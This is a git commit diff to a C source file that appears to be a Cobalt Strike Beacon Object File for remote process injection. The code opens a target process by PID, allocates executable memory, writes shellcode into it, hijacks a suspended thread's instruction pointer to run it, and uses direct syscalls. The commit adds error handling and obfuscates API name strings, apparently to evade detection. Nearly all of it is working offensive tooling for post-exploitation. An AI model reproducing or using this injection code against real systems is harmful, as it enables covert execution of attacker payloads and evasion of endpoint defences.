2b4128f8a8df76ea694ec0853d5ce780574ecaaf
chrispentester <81834454+chrispentester@users.noreply.github.com>
2021-04-19 11:08:29 -0700

    Add files via upload

--- syscall_stcinject/syscall_stcinject.c
+++ syscall_stcinject/syscall_stcinject.c
@@ -6,8 +6,9 @@
 #include "beacon.h"
 #include "Syscalls.h"
 #include "syscalls-asm.h"
+#include "stdint.h"
 
-
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
 
 void go(char * argc, int len)
@@ -15,11 +16,15 @@ void go(char * argc, int len)
 	char* shellcode;
 	SIZE_T shell_len;
 	datap	parser;
-	HANDLE Process_Handle;
+	HANDLE Process_Handle = NULL;
 	CLIENT_ID id = {0};
 	OBJECT_ATTRIBUTES oa = {sizeof(oa)};
 	PVOID Alloc = NULL;
 	CONTEXT ctx;
+	NTSTATUS status;
+	// Obfuscate strings
+	uint8_t loadlib[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0x00 };
+	uint8_t krnl32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x00 };
 
 	BeaconDataParse(&parser, argc, len);
 	DWORD pid = BeaconDataInt(&parser);
@@ -28,21 +33,74 @@ void go(char * argc, int len)
 	id.UniqueProcess = pid;
 	char currentDir[MAX_PATH];
 	SIZE_T bytesWritten = 0;
-	HANDLE threadHandle;
+	HANDLE threadHandle = NULL;
 
-	NtOpenProcess(&Process_Handle, PROCESS_ALL_ACCESS, &oa, &id);
-	NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	// Open Process
+	status = NtOpenProcess(&Process_Handle, PROCESS_ALL_ACCESS, &oa, &id);
+	if(!NT_SUCCESS(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Failed NtOpenProcess");
+		goto clean;
+	}
+	
+	// Allocate Memory
+	status = NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if(!NT_SUCCESS(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Failed NtAllocateVirtualMemory");
+		goto clean;
+	}
 
-	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
-	NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
-	NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, Process_Handle, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);
-
+	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA((const char*)krnl32), (const char*)loadlib);
+	
+	//BeaconPrintf(CALLBACK_OUTPUT, "%p",_loadLibrary);
+	status = NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
+	if(!NT_SUCCESS(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Failed NtWriteVirtualMemory");
+		goto clean;
+	}
+	
+	status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, Process_Handle, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);
+	if(!NT_SUCCESS(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Failed NtCreateThreadEx");
+		goto clean;
+	}
+	
 	ctx.ContextFlags = CONTEXT_CONTROL;
-	NtGetContextThread(threadHandle, &ctx);
+	status = NtGetContextThread(threadHandle, &ctx);
+	if(!NT_SUCCESS(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Failed NtGetContextThread");
+		goto clean;
+	}
+	
 	ctx.Rip = (DWORD64)Alloc;
-	NtSetContextThread(threadHandle, &ctx);
-	NtResumeThread(threadHandle, NULL);
+	status = NtSetContextThread(threadHandle, &ctx);
+	if(!NT_SUCCESS(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Failed NtSetContextThread");
+		goto clean;
+	}
+	
+	status = NtResumeThread(threadHandle, NULL);
+	if(!NT_SUCCESS(status))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Failed NtResumeThread");
+		goto clean;
+	}
 
-	NtClose(threadHandle);
-	NtClose(Process_Handle);
+clean:
+	//BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up...");
+	if(threadHandle != NULL)
+	{
+		//BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up threadHandle");
+		NtClose(threadHandle);
+	}
+	if(Process_Handle != NULL)
+	{
+		//BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up Process_Handle");
+		NtClose(Process_Handle);
+	}
 }
